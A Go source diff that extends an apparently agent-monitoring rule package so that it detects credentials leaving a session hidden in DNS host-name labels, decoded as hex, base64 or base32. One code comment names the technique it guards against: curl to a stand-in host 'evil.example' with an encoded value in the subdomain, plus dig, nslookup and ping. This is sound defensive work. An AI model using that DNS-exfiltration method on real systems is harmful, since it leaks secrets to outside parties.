@@ -3,6 +3,7 @@ package rules
 import (
 	"crypto/hmac"
 	"crypto/sha256"
+	"encoding/base32"
 	"encoding/base64"
 	"encoding/hex"
 	"net/url"
@@ -24,6 +25,16 @@ import (
 // Fingerprints are HMAC-SHA-256 under a random per-session salt, so the
 // exported session state neither contains the values nor lets anyone match
 // them across sessions or hosts.
+//
+// Host names are a channel of their own (DNS exfiltration: curl
+// https://<hex>.evil.example/, dig, nslookup, ping). Every dotted name in
+// the outbound text is also split into its labels: each label, long labels
+// cut at the 63-byte DNS label limit, and runs of consecutive labels joined
+// (an encoder spreads one value over several labels) are candidates, raw
+// and decoded as hex, base64, base64url or base32. A raw label match counts
+// only for values that are credentials by format or by name: values kept
+// only because they look machine generated are often identifiers (project
+// refs, bucket names) that are legitimately used as subdomains.
 
 const (
 	minSecretValue  = 8
@@ -59,7 +70,10 @@ func secretName(k string) bool {
 	return false
 }
 
-type secretValue struct{ v, kind string }
+type secretValue struct {
+	v, kind string
+	weak    bool // kept for its entropy only (see secretFP.weak)
+}
 
 // secretValues extracts credential values from the output of a
 // credential-class read: everything classify.FindSecrets recognises, plus
@@ -71,18 +85,24 @@ func secretValues(text string) []secretValue {
 		text = cutHead(text, maxSecretText/2) + "\n" + cutTail(text, maxSecretText/2)
 	}
 	var out []secretValue
-	seen := map[string]bool{}
-	add := func(v, kind string) {
+	seen := map[string]int{} // value -> index in out
+	add := func(v, kind string, weak bool) {
 		v = strings.TrimSpace(v)
-		if len(v) < minSecretValue || len(v) > maxSecretValue || seen[v] {
+		if len(v) < minSecretValue || len(v) > maxSecretValue {
 			return
 		}
-		seen[v] = true
-		out = append(out, secretValue{v, kind})
+		if i, ok := seen[v]; ok {
+			if !weak {
+				out[i].weak = false
+			}
+			return
+		}
+		seen[v] = len(out)
+		out = append(out, secretValue{v, kind, weak})
 	}
 	for _, h := range classify.FindSecrets(text) {
 		if h.Start >= 0 && h.End <= len(text) && h.Start < h.End {
-			add(text[h.Start:h.End], h.Kind)
+			add(text[h.Start:h.End], h.Kind, false)
 		}
 	}
 	lines := strings.SplitN(text, "\n", maxEnvLines+1)
@@ -98,8 +118,8 @@ func secretValues(text string) []secretValue {
 		if strings.ContainsAny(v, " \t") {
 			continue
 		}
-		if secretName(m[1]) || classify.Entropy(v) >= minValueEntropy {
-			add(v, "env_value")
+		if named := secretName(m[1]); named || classify.Entropy(v) >= minValueEntropy {
+			add(v, "env_value", !named)
 		}
 	}
 	return out
@@ -147,7 +167,7 @@ func (s *sessionState) captureSecrets(ev *event.Event) {
 	}
 	fp := s.fingerprinter()
 	for _, sv := range secretValues(ev.Content.ToolOutput) {
-		s.addSecret(fp(sv.v), sv.kind, len(sv.v))
+		s.addSecret(fp(sv.v), sv.kind, len(sv.v), sv.weak)
 	}
 }
 
@@ -255,10 +275,10 @@ func (s *sessionState) secretFlow(ev *event.Event) (kinds []string, checked, tru
 	if len(texts) == 0 {
 		return nil, false, false
 	}
-	want := make(map[string]string, len(s.secrets))
-	sc := &flowScan{budget: maxFlowCands, seen: map[string]bool{}, lens: map[int]bool{}}
+	want := make(map[string]secretFP, len(s.secrets))
+	sc := &flowScan{budget: maxFlowCands, seen: map[string]uint8{}, lens: map[int]bool{}}
 	for _, x := range s.secrets {
-		want[x.fp] = x.kind
+		want[x.fp] = x
 		if x.n > 0 {
 			sc.lens[x.n] = true
 		} else {
@@ -267,9 +287,9 @@ func (s *sessionState) secretFlow(ev *event.Event) (kinds []string, checked, tru
 	}
 	found := map[string]bool{}
 	fp := s.fingerprinter()
-	sc.match = func(c string) {
-		if k, ok := want[fp(c)]; ok {
-			found[k] = true
+	sc.match = func(c string, weakToo bool) {
+		if x, ok := want[fp(c)]; ok && (weakToo || !x.weak) {
+			found[x.kind] = true
 		}
 	}
 	// Shortest first: a value hidden behind a long padding string is
@@ -294,6 +314,16 @@ scan:
 			total += len(p)
 			flowCandidates(p, sc)
 		}
+	}
+	// Then the labels of every dotted name the token pass met, shortest
+	// name first, so neither a long padded name nor label padding can
+	// spend the budget before the plain tokens were seen.
+	sort.SliceStable(sc.names, func(i, j int) bool { return len(sc.names[i]) < len(sc.names[j]) })
+	for _, n := range sc.names {
+		if sc.exhausted {
+			break
+		}
+		sc.labelCandidates(n)
 	}
 	truncated = truncated || sc.exhausted
 	for k := range found {
@@ -366,21 +396,44 @@ func fields(s string, sep *[256]bool, f func(string)) {
 
 // flowScan carries the candidate budget of one event. A candidate is
 // fingerprinted only when its length is the length of a remembered value,
-// each distinct candidate is considered once, and a candidate that can be
-// neither fingerprinted nor decoded costs nothing, so repeated or
-// wrong-length padding spends no budget.
+// each distinct candidate is considered once per way it was found, and a
+// candidate that can be neither fingerprinted nor decoded costs nothing,
+// so repeated or wrong-length padding spends no budget.
 type flowScan struct {
 	budget    int
-	seen      map[string]bool // candidate -> its decodings were tried
+	seen      map[string]uint8 // candidate -> what was done with it (seen* bits)
 	lens      map[int]bool
 	anyLen    bool
-	match     func(string)
+	match     func(c string, weakToo bool)
 	exhausted bool
+	// names are the dotted tokens met by the token pass, for the label
+	// pass; named dedups them.
+	names []string
+	named map[string]bool
 }
+
+// What consider did with a candidate.
+const (
+	seenAll     uint8 = 1 << iota // fingerprinted against every remembered value
+	seenStrong                    // fingerprinted against values that are credentials by format or name
+	seenDecoded                   // decodings tried
+)
+
+// candMode says where a candidate came from, which decides which
+// remembered values it may match and whether it is decoded.
+type candMode uint8
+
+const (
+	candToken   candMode = iota // a token of the outbound text: any value; decoded
+	candDecoded                 // text a decoding produced: any value; not decoded again
+	candLabel                   // a DNS label or consecutive labels run together: strong values raw; decoded, base32 too
+	candDotted                  // consecutive labels with their dots: strong values raw; not decoded
+)
 
 // flowCandidates considers every substring of text that could be a whole
 // credential value: tokens at three granularities, each also after URL,
-// base64 and hex decoding (one level).
+// base64 and hex decoding (one level). Tokens with a dot are remembered
+// for the label pass.
 func flowCandidates(text string, sc *flowScan) {
 	versions := []string{text}
 	if strings.ContainsRune(text, '%') {
@@ -393,15 +446,18 @@ func flowCandidates(text string, sc *flowScan) {
 			if sc.exhausted {
 				return
 			}
-			sc.consider(tok, true)
+			sc.consider(tok, candToken)
+			sc.noteName(tok)
 			fields(tok, sepKV, func(sub string) {
 				if sub != tok {
-					sc.consider(sub, true)
+					sc.consider(sub, candToken)
+					sc.noteName(sub)
 				}
 			})
 			fields(tok, sepKVPath, func(sub string) {
 				if sub != tok {
-					sc.consider(sub, true)
+					sc.consider(sub, candToken)
+					sc.noteName(sub)
 				}
 			})
 		})
@@ -411,17 +467,38 @@ func flowCandidates(text string, sc *flowScan) {
 	}
 }
 
-func (sc *flowScan) consider(c string, decode bool) {
+// noteName remembers a token that could be a host name for the label pass.
+func (sc *flowScan) noteName(tok string) {
+	if len(tok) < minSecretValue || strings.IndexByte(tok, '.') < 0 {
+		return
+	}
+	if sc.named == nil {
+		sc.named = map[string]bool{}
+	}
+	if !sc.named[tok] {
+		sc.named[tok] = true
+		sc.names = append(sc.names, tok)
+	}
+}
+
+func (sc *flowScan) consider(c string, mode candMode) {
 	if len(c) < minSecretValue || len(c) > maxSecretValue {
 		return
 	}
-	fingerprint := sc.anyLen || sc.lens[len(c)]
-	if !fingerprint && (!decode || len(c) < 12) {
-		return // neither a possible value nor decodable (decodings need 12+ bytes)
+	var want uint8
+	if sc.anyLen || sc.lens[len(c)] {
+		want = seenStrong
+		if mode == candToken || mode == candDecoded {
+			want |= seenAll
+		}
 	}
-	tried, ok := sc.seen[c]
-	if ok && (tried || !decode) {
-		return
+	if (mode == candToken || mode == candLabel) && len(c) >= 12 {
+		want |= seenDecoded // decodings need 12+ bytes
+	}
+	have, ok := sc.seen[c]
+	todo := want &^ have
+	if todo == 0 {
+		return // neither a possible value nor decodable, or done already
 	}
 	if !ok {
 		if sc.budget <= 0 {
@@ -429,23 +506,101 @@ func (sc *flowScan) consider(c string, decode bool) {
 			return
 		}
 		sc.budget--
-		if fingerprint {
-			sc.match(c)
-		}
 	}
-	sc.seen[c] = decode
-	if !decode {
+	sc.seen[c] = have | todo
+	if todo&(seenAll|seenStrong) != 0 {
+		sc.match(c, todo&seenAll != 0)
+	}
+	if todo&seenDecoded == 0 {
 		return
 	}
-	for _, d := range decodings(c) {
-		sc.consider(strings.TrimSpace(d), false)
-		fields(d, sepDecoded, func(tok string) { sc.consider(tok, false) })
+	for _, d := range decodings(c, mode == candLabel) {
+		sc.consider(strings.TrimSpace(d), candDecoded)
+		fields(d, sepDecoded, func(tok string) { sc.consider(tok, candDecoded) })
 	}
 }
 
-// decodings returns c decoded as base64 (any alphabet) or hex, when it
-// decodes to text.
-func decodings(c string) []string {
+// Bounds of the label pass over one dotted name.
+const (
+	maxDNSLabel      = 63  // longer labels are also cut into pieces of this size
+	maxLabelRun      = 16  // pieces run together into one candidate
+	maxLabelRunBytes = 512 // bytes of one run (a DNS name is at most 253)
+)
+
+// labelCandidates considers the labels of a dotted name: every label (a
+// label over 63 bytes also in 63-byte pieces) and every run of up to 16
+// consecutive pieces joined without the dots, raw and decoded, because an
+// encoder that spreads one value over several labels is undone by
+// concatenation; and every run of whole labels with its dots, raw, for a
+// value that has dots of its own (a JWT).
+func (sc *flowScan) labelCandidates(name string) {
+	var labels [][2]int // [start, end) of each label, empty ones included
+	start := 0
+	for i := 0; i <= len(name); i++ {
+		if i == len(name) || name[i] == '.' {
+			labels = append(labels, [2]int{start, i})
+			start = i + 1
+		}
+	}
+	if len(labels) < 2 {
+		return
+	}
+	for i := 0; i < len(labels) && !sc.exhausted; i++ {
+		for j := i + 1; j < len(labels); j++ {
+			a, b := labels[i][0], labels[j][1]
+			if b-a > maxLabelRunBytes {
+				break
+			}
+			if i > 0 || j < len(labels)-1 { // the whole name was a token
+				sc.consider(name[a:b], candDotted)
+			}
+		}
+	}
+	var pieces []string
+	for _, l := range labels {
+		p := name[l[0]:l[1]]
+		for len(p) > maxDNSLabel {
+			pieces = append(pieces, p[:maxDNSLabel])
+			p = p[maxDNSLabel:]
+		}
+		if p != "" {
+			pieces = append(pieces, p)
+		}
+	}
+	ok64 := make([]bool, len(pieces))
+	for i, p := range pieces {
+		ok64[i] = isBase64ish(p)
+	}
+	var buf []byte
+	for i := range pieces {
+		if sc.exhausted {
+			return
+		}
+		sc.consider(pieces[i], candLabel)
+		buf = append(buf[:0], pieces[i]...)
+		dec := ok64[i]
+		for j := i + 1; j < len(pieces) && j-i < maxLabelRun; j++ {
+			if len(buf)+len(pieces[j]) > maxLabelRunBytes {
+				break
+			}
+			buf = append(buf, pieces[j]...)
+			dec = dec && ok64[j]
+			// Materialise the run only when it could be a value or decode
+			// to text holding one.
+			if sc.anyLen || sc.lens[len(buf)] || dec && len(buf) >= 12 {
+				sc.consider(string(buf), candLabel)
+			}
+		}
+	}
+}
+
+// base32NoPad decodes the base32 that DNS tunnels use (RFC 4648, no
+// padding; labels are case-insensitive, so input is upper-cased first).
+var base32NoPad = base32.StdEncoding.WithPadding(base32.NoPadding)
+
+// decodings returns c decoded as base64 (any alphabet) or hex, and with
+// dns also as base32, when it decodes to text.
+func decodings(c string, dns bool) []string {
 	var out []string
 	if len(c) >= 12 && isBase64ish(c) {
 		for _, enc := range []*base64.Encoding{base64.StdEncoding, base64.RawStdEncoding, base64.URLEncoding, base64.RawURLEncoding} {
@@ -460,6 +615,11 @@ func decodings(c string) []string {
 			out = append(out, string(b))
 		}
 	}
+	if dns && len(c) >= 13 && isBase32ish(c) {
+		if b, err := base32NoPad.DecodeString(strings.ToUpper(strings.TrimRight(c, "="))); err == nil && printable(b) {
+			out = append(out, string(b))
+		}
+	}
 	return out
 }
 
@@ -467,6 +627,16 @@ func isBase64ish(s string) bool {
 	for i := 0; i < len(s); i++ {
 		c := s[i]
 		if !(c >= 'A' && c <= 'Z' || c >= 'a' && c <= 'z' || c >= '0' && c <= '9' || c == '+' || c == '/' || c == '=' || c == '-' || c == '_') {
+			return false
+		}
+	}
+	return true
+}
+
+func isBase32ish(s string) bool {
+	for i := 0; i < len(s); i++ {
+		c := s[i]
+		if !(c >= 'A' && c <= 'Z' || c >= 'a' && c <= 'z' || c >= '2' && c <= '7' || c == '=') {
 			return false
 		}
 	}
